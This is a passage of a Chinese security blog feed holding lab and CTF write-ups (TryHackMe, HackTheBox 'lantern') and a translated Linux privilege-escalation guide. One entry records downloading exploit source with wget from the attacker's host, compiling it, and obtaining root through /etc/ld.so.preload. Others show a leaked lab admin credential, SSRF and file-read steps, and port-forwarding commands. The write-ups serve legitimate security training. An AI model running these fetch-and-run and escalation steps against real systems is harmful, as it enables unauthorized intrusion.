class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿LeoBook)-[~/seclab]</span><br><span class="line">└─$ echo &quot;eFdpbnRlcjE5OTV4IQ==&quot;|base64 -d</span><br><span class="line">xWinter1995x!</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241118213042.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118213042.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241118213448.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118213448.png"></a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><a href="/../assets/img/Pasted%20image%2020241118215501.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118215501.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241118215517.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118215517.png"></a></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/tmp$ wget 10.17.5.121:8888/cc.c</span><br><span class="line">--2024-11-18 06:13:27--  http://10.17.5.121:8888/cc.c</span><br><span class="line">Connecting to 10.17.5.121:8888... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 5120 (5.0K) [text/x-csrc]</span><br><span class="line">Saving to: &#x27;cc.c&#x27;</span><br><span class="line"></span><br><span class="line">100%[==========================================================================&gt;] 5,120       --.-K/s   in 0s</span><br><span class="line"></span><br><span class="line">2024-11-18 06:13:27 (29.3 MB/s) - &#x27;cc.c&#x27; saved [5120/5120]</span><br><span class="line"></span><br><span class="line">www-data@ubuntu:/tmp$ cc cc.c -o c</span><br><span class="line">cc.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]</span><br><span class="line">&#125;</span><br><span class="line">^</span><br><span class="line">cc.c:106:12: warning: implicit declaration of function &#x27;unshare&#x27; is invalid in C99 [-Wimplicit-function-declaration]</span><br><span class="line">        if(unshare(CLONE_NEWUSER) != 0)</span><br><span class="line">           ^</span><br><span class="line">cc.c:111:17: warning: implicit declaration of function &#x27;clone&#x27; is invalid in C99 [-Wimplicit-function-declaration]</span><br><span class="line">                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);</span><br><span class="line">                ^</span><br><span class="line">cc.c:117:13: warning: implicit declaration of function &#x27;waitpid&#x27; is invalid in C99 [-Wimplicit-function-declaration]</span><br><span class="line">            waitpid(pid, &amp;status, 0);</span><br><span class="line">            ^</span><br><span class="line">cc.c:127:5: warning: implicit declaration of function &#x27;wait&#x27; is invalid in C99 [-Wimplicit-function-declaration]</span><br><span class="line">    wait(NULL);</span><br><span class="line">    ^</span><br><span class="line">5 warnings generated.</span><br><span class="line">www-data@ubuntu:/tmp$ ./c</span><br><span class="line">spawning threads</span><br><span class="line">mount #1</span><br><span class="line">mount #2</span><br><span class="line">child threads done</span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">child threads done</span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br><span class="line"># find / -name *flag* 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/11/18/wsl/"/>
      <url>/2024/11/18/wsl/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>wsl –shutdown &amp;&amp; wsl</p><p><code>.wslconfig</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[experimental]</span><br><span class="line">networkingMode=mirrored</span><br><span class="line">dnsTunneling=true</span><br><span class="line">firewall=true</span><br><span class="line">autoProxy=true</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/11/17/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/"/>
      <url>/2024/11/17/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h3 id="场景1"><a href="#场景1" class="headerlink" title="场景1"></a>场景1</h3><p>主机1可以访问 10.10.11.29:80<br>但是主机2访问不到 ，主机2可以访问到主机1的ip</p><p>主机1执行 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo socat TCP-LISTEN:8080,fork TCP:10.10.11.29:80</span><br></pre></td></tr></table></figure><p>主机1的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet 10.255.255.254/32 brd 10.255.255.254 scope global lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:15:5d:e3:58:b0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.25.105.124/20 brd 172.25.111.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::215:5dff:fee3:58b0/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">4: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500</span><br><span class="line">    link/none</span><br><span class="line">    inet 10.10.16.83/23 scope global tun0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 dead:beef:4::1051/64 scope global</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::92d1:c70f:2dbe:3561/64 scope link stable-privacy</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>意思是<code>10.10.11.29:80</code> fork 到本机的<code>172.25.105.124:8080</code> ，就是你访问ip:8080 也就是访问<code>10.10.11.29:80</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add 10.10.11.29 mask 255.255.255.255 172.25.105.124</span><br></pre></td></tr></table></figure><h3 id="动态端口转发"><a href="#动态端口转发" class="headerlink" title="动态端口转发"></a>动态端口转发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo socat TCP-LISTEN:8080,fork SOCKS5:127.0.0.1:lantern.htb:80,socksport=1080</span><br></pre></td></tr></table></figure><p>如果您希望使用简单的工具并通过配置文件来实现多端口代理，以下是几种适合的工具：</p><h3 id="1-redir-简单的端口转发工具"><a href="#1-redir-简单的端口转发工具" class="headerlink" title="1. redir (简单的端口转发工具)"></a>1. <strong><code>redir</code> (简单的端口转发工具)</strong></h3><p>虽然 <code>redir</code> 本身没有直接支持多个端口代理的功能，但您可以通过配置文件或脚本的方式来启动多个端口转发。可以创建一个脚本，像这样：</p><p>bash</p><p>复制代码</p><p><code>#!/bin/bash  # 配置多个端口转发 redir --lport=80 --caddr=10.10.11.29 --cport=80 &amp; redir --lport=8080 --caddr=10.10.11.29 --cport=8080 &amp; redir --lport=443 --caddr=10.10.11.29 --cport=443 &amp;</code></p><p>这种方法的优点是非常简单，但仍然需要通过脚本来配置多个端口。</p><h3 id="2-rinetd-配置文件方式"><a href="#2-rinetd-配置文件方式" class="headerlink" title="2. rinetd (配置文件方式)"></a>2. <strong><code>rinetd</code> (配置文件方式)</strong></h3><p><code>rinetd</code> 是一个非常适合通过配置文件来管理多个端口转发的工具。您可以创建一个配置文件 <code>/etc/rinetd.conf</code>，内容如下：</p><p>bash</p><p>复制代码</p><p><code># 转发配置 0.0.0.0 80 10.10.11.29 80 0.0.0.0 8080 10.10.11.29 8080 0.0.0.0 443 10.10.11.29 443</code></p><p>配置好后，您只需要启动 <code>rinetd</code>：</p><p>bash</p><p>复制代码</p><p><code>sudo rinetd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>lantern</title>
      <link href="/2024/11/17/lantern/"/>
      <url>/2024/11/17/lantern/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote><p>难度：难<br>描述：<br>前置条件：</p></blockquote><h2 id="https-racc0x-github-io-posts-lantern-box-info"><a href="#https-racc0x-github-io-posts-lantern-box-info" class="headerlink" title="https://racc0x.github.io/posts/lantern/#box-info"></a><a href="https://racc0x.github.io/posts/lantern/#box-info">https://racc0x.github.io/posts/lantern/#box-info</a></h2><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.11.29</td></tr><tr><td>OS</td><td>kali</td><td>Linux</td></tr></tbody></table><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[~] The config file is expected to be at &quot;/home/kali/.rustscan.toml&quot;</span><br><span class="line">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers</span><br><span class="line">[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;.</span><br><span class="line">Open 10.10.11.29:22</span><br><span class="line">Open 10.10.11.29:80</span><br><span class="line">Open 10.10.11.29:3000</span><br><span class="line">[~] Starting Script(s)</span><br><span class="line">[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 01:06 CST</span><br><span class="line">Initiating Ping Scan at 01:06</span><br><span class="line">Scanning 10.10.11.29 [2 ports]</span><br><span class="line">Completed Ping Scan at 01:06, 0.24s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 01:06</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 01:06, 0.01s elapsed</span><br><span class="line">DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]</span><br><span class="line">Initiating Connect Scan at 01:06</span><br><span class="line">Scanning lantern.htb (10.10.11.29) [3 ports]</span><br><span class="line">Discovered open port 80/tcp on 10.10.11.29</span><br><span class="line">Discovered open port 22/tcp on 10.10.11.29</span><br><span class="line">Discovered open port 3000/tcp on 10.10.11.29</span><br><span class="line">Completed Connect Scan at 01:06, 0.24s elapsed (3 total ports)</span><br><span class="line">Nmap scan report for lantern.htb (10.10.11.29)</span><br><span class="line">Host is up, received syn-ack (0.24s latency).</span><br><span class="line">Scanned at 2024-11-18 01:06:52 CST for 0s</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE REASON</span><br><span class="line">22/tcp   open  ssh     syn-ack</span><br><span class="line">80/tcp   open  http    syn-ack</span><br><span class="line">3000/tcp open  ppp     syn-ack</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a href="#路径枚举" class="headerlink" title="路径枚举"></a>路径枚举</h3><h2 id="特殊点"><a href="#特殊点" class="headerlink" title="特殊点"></a>特殊点</h2><p>文件上传？<br><a href="/../assets/img/Pasted%20image%2020241118012812.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118012812.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241118013600.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118013600.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241118014020.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118014020.png"></a><br>Skipper Proxy 是一种开源 HTTP 代理，旨在管理和路由 Web 流量。</p><p>SSRF<br><a href="/../assets/img/Pasted%20image%2020241118014419.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118014419.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241118014522.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118014522.png"></a><br><a href="/../assets/img/Pasted%20image%2020241118015508.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118015508.png"></a></p><p>获取密码没看懂, 先看别人wp获取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用凭证登录 lantern.htb：3000   admin:AJbFA_Q@925p9ap#22</span><br></pre></td></tr></table></figure><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><a href="/../assets/img/Pasted%20image%2020241118020110.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118020110.png"></a><br><a href="/../assets/img/Pasted%20image%2020241118020300.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118020300.png"></a></p><p>本地文件读取</p><p><a href="/../assets/img/Pasted%20image%2020241118020721.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118020721.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241118020817.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241118020817.png"></a></p><p>获取到用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomas:x:1000:1000:tomas:/home/tomas:/bin/bash</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 权限提升</title>
      <link href="/2024/11/17/linprivesc/"/>
      <url>/2024/11/17/linprivesc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p><a href="https://www.cnblogs.com/Hekeats-L/p/16867299.html">https://www.cnblogs.com/Hekeats-L/p/16867299.html</a></p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote><p>难度：<br>描述：<br>前置条件：</p></blockquote><hr><blockquote><p>权限提升是一个旅程。没有灵丹妙药，很大程度上取决于目标系统的具体配置。内核版本、安装的应用程序、支持的编程语言、其他用户的密码是影响您通往 root shell 之路的几个关键因素。  </p></blockquote><p>此房间旨在涵盖主要的权限提升向量，并让您更好地了解该过程。无论您是参加 CTF、参加认证考试还是担任渗透测试人员，这项新技能都将成为您武器库的重要组成部分。</p><h1 id="“权限提升”是什么意思？"><a href="#“权限提升”是什么意思？" class="headerlink" title="“权限提升”是什么意思？"></a>“权限提升”是什么意思？</h1><p>从本质上讲，权限提升通常涉及从较低权限的帐户转到较高权限的帐户。从技术上讲，它是利用操作系统或应用程序中的漏洞、设计缺陷或配置疏忽，以未经授权访问通常限制用户访问的资源。  </p><p>为什么它很重要？</p><p>在执行实际渗透测试时，很少能够获得提供直接管理访问权限的立足点 （初始访问权限）。权限提升至关重要，因为它允许您获得系统管理员级别的访问权限，从而允许您执行以下操作：</p><ul><li><p>重置密码  </p></li><li><p>绕过访问控制以破坏受保护的数据</p></li><li><p>编辑软件配置</p></li><li><p>启用持久性</p></li><li><p>更改现有（或新）用户的权限</p></li></ul><p>枚举是访问任何系统后必须采取的第一步。您可能通过利用导致 root 级访问的关键漏洞访问了系统，或者只是找到了一种使用低权限帐户发送命令的方法。与 CTF 计算机不同，渗透测试活动不会在您获得特定系统或用户权限级别的访问权限后结束。正如您将看到的，枚举在妥协后阶段与以前一样重要。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure><p>该 命令将返回目标计算机的主机名。尽管此值可以很容易地更改或具有相对无意义的字符串（例如 Ubuntu-3487340239），但在某些情况下，它可以提供有关目标系统在公司网络中的角色的信息（例如，SQL-PROD-01 用于生产 SQL Server）。</p><p><code>uname -a</code><br>将打印系统信息，为我们提供有关系统使用的内核的更多详细信息。这在搜索任何可能导致权限提升的潜在内核漏洞时非常有用。</p><p><code>cat /etc/os-release</code><br><code>/proc/version</code><br>proc 文件系统 （procfs） 提供有关目标系统进程的信息。您会在许多不同的 Linux 版本上找到 proc，使其成为您武器库中必不可少的工具。</p><p>查看 可能会为您提供有关内核版本和其他数据的信息，例如是否安装了编译器（例如 GCC）。</p><p><code>/etc/issue</code><br>还可以通过查看文件来识别系统 。此文件通常包含有关操作系统的一些信息，但可以很容易地进行自定义或更改。在主题上，可以自定义或更改任何包含系统信息的文件。为了更清楚地了解该系统，查看所有这些总是好的<br><code>ps</code><br>命令 是查看 Linux 系统上正在运行的进程的有效方法。 在终端上键入将显示当前 壳</p><p>（Process Status） 的输出将显示以下内容;<code>ps</code></p><ul><li>PID：进程 ID（对进程唯一）</li><li>TTY：用户使用的终端类型</li><li>时间：进程使用的 CPU 时间量（这不是此进程的运行时间）</li><li>CMD：正在运行的命令或可执行文件（不会显示任何命令行参数）</li></ul><p>“ps” 命令提供了一些有用的选项。</p><ul><li><p><code>ps -A</code>：查看所有正在运行的进程</p></li><li><p><code>ps axjf</code>：查看进程树（请参阅下面的树形成，直到运行）<code>ps axjf</code></p></li><li><p><code>ps aux</code>：该选项将显示所有用户的进程 （a），显示启动进程的用户 （u），并显示未附加到终端的进程 （x）。查看 ps aux 命令输出，我们可以更好地了解系统和潜在漏洞。<code>aux</code></p></li></ul><p><code>env</code><br>PATH 变量可能具有编译器或脚本语言（例如 Python），可用于在目标系统上运行代码或用于权限提升</p><p><code>sudo -l</code></p><p>目标系统可以配置为允许用户使用 root 权限运行某些（或全部）命令。该 命令可用于列出您的用户可以使用 运行的所有命令。</p><p><code>ifconfig</code><br><code>history</code><br><code>netstat</code></p><ul><li><code>netstat -a</code>：显示 所有侦听端口和已建立的连接。</li><li><code>netstat -at</code>或者也可以用来列出 TCP 或 UDP 协议 分别。<code>netstat -au</code></li><li><code>netstat -l</code>：列表 端口处于 “侦听” 模式。这些端口已打开并准备好 接受传入连接。这可以与 “t” 选项一起使用 仅列出正在使用 TCP 协议侦听的端口（如下）</li></ul><h3 id="find-命令"><a href="#find-命令" class="headerlink" title="find 命令"></a>find 命令</h3><p>在目标系统中搜索重要信息，以及 潜在的权限提升向量可能是有益的。内置的 “find” 命令很有用，值得保存在您的武器库中。</p><p>以下是 “find” 命令的一些有用示例。</p><p><strong>查找文件：</strong></p><ul><li><code>find . -name flag1.txt</code>：flag1.txt在 当前目录</li><li><code>find /home -name flag1.txt</code>：flag1.txt在 &#x2F;home 目录</li><li><code>find / -type d -name config</code>：在 “&#x2F;” 下找到名为 config 的目录</li><li><code>find / -type f -perm 0777</code>：查找具有 777 权限的文件 （所有用户都可以读取、可写和执行文件）</li><li><code>find / -perm a=x</code>：查找可执行文件</li><li><code>find /home -user frank</code>：在 “&#x2F;home”</li><li><code>find / -mtime 10</code>：查找最近 10 个中修改的文件 日</li><li><code>find / -atime 10</code>：查找最近 10 个中访问的文件 日</li><li><code>find / -cmin -60</code>：查找过去一小时内更改的文件 （60 分钟）</li><li><code>find / -amin -60</code>：查找过去一小时内的文件访问 （60 分钟）</li><li><code>find / -size 50M</code>：查找大小为 50 MB 的文件</li></ul><p>此命令还可以与 （+） 和 （-） 符号一起使用，以指定 大于或小于给定大小的文件。</p><h2 id="自动枚举"><a href="#自动枚举" class="headerlink" title="自动枚举"></a>自动枚举</h2><p>有几种工具可以帮助您在枚举过程中节省时间 过程。这些工具仅用于节省时间，因为它们知道 可能会错过一些权限提升向量。以下是 流行的 Linux 枚举工具及其各自 Github 的链接 存储 库。</p><p>目标系统的环境将影响您将要创建的工具 能够使用。例如，您将无法运行工具 如果目标系统上未安装 Python 编写。这 这就是为什么最好熟悉一些而不是 拥有单一的必备工具。</p><ul><li><strong>林豌豆</strong>： <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></li><li><strong>LinEnum：</strong><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a><a href="https://github.com/rebootuser/LinEnum"></a></li><li><strong>LES （Linux Exploit Suggester）：</strong><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li><li><strong>Linux 智能枚举：</strong><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li><li><strong>Linux Priv Checker：</strong> <a href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a></li></ul><p>理想情况下，权限提升会导致 root 权限。这可以 有时只需利用现有漏洞即可实现， 或者在某些情况下，通过访问另一个具有更多 权限、信息或访问权限。</p><p>除非单个 漏洞会导致 root shell，即权限提升过程 将依赖于错误的配置和松散的权限。</p><p>Linux 系统上的内核管理组件之间的通信，例如 系统和应用程序上的内存。这个关键功能 要求内核具有特定权限;因此，成功的 利用漏洞可能会导致 root 权限。</p><p>内核漏洞 方法很简单;</p><ol><li>确定 内核版本</li><li>搜索和查找 目标系统内核版本的漏洞利用代码</li><li>运行漏洞利用</li></ol><p>虽然看起来 很简单，请记住，失败的内核漏洞利用可能会导致 系统崩溃。确保此潜在结果是可以接受的 在尝试 内核漏洞。</p><p><strong>研究来源：</strong>  </p><ol><li>根据您的发现，您可以使用 Google 搜索现有的漏洞利用代码。</li><li><a href="https://www.cvedetails.com/">https://www.cvedetails.com/</a> 等来源也很有用。</li><li>另一种选择是使用 LES （Linux Exploit Suggester） 之类的脚本，但请记住，这些工具可能会产生误报（报告不影响目标系统的内核漏洞）或漏报（尽管内核易受攻击，但不报告任何内核漏洞）。</li></ol><p><strong>提示&#x2F;注释：</strong></p><ol><li>在 Google、Exploit-db 或 searchsploit 上搜索漏洞时，内核版本过于具体</li><li>在启动漏洞利用代码之前，请确保您了解它的工作原理。一些漏洞利用代码可以在操作系统上进行更改，使它们在进一步使用时不安全，或者对系统进行不可逆的更改，从而在以后产生问题。当然，在实验室或 CTF 环境中，这些可能不是很大的问题，但在真正的渗透测试参与中，这些绝对是禁忌。</li><li>某些漏洞利用程序在运行后可能需要进一步的交互。阅读漏洞利用代码提供的所有注释和说明。</li><li>您可以使用 Python 模块将漏洞利用代码从您的计算机传输到目标系统。<code>SimpleHTTPServer``wget</code></li></ol><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>默认情况下，sudo 命令允许您使用 root 权限运行程序。在某些情况下，系统管理员可能需要为普通用户提供一些权限灵活性。例如，初级 SOC 分析师可能需要定期使用 Nmap，但无法获得完全 root 访问权限。在这种情况下，系统管理员可以允许该用户仅以 root 权限运行 Nmap，同时在系统的其余部分保持其常规权限级别。</p><p>任何用户都可以使用该命令检查其与 root 权限相关的当前情况。<code>sudo -l</code></p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 是一个有价值的资源，它提供了有关如何使用您可能拥有 sudo 权限的任何程序的信息。<br><strong>利用应用程序功能</strong>  </p><p>在此上下文中，某些应用程序不会有已知的漏洞利用。您可能会看到这样的应用程序是 Apache2 服务器。</p><p>在这种情况下，我们可以使用 “hack” 来利用应用程序的功能来泄露信息。正如你在下面看到的，Apache2 有一个支持加载备用配置文件的选项（ ： 指定一个备用的 ServerConfigFile）。<code>-f</code></p><p>使用此选项加载文件将导致包含文件第一行的错误消息。<code>/etc/shadow``/etc/shadow</code></p><p><strong>杆LD_PRELOAD</strong></p><p>在某些系统上，您可能会看到 LD_PRELOAD 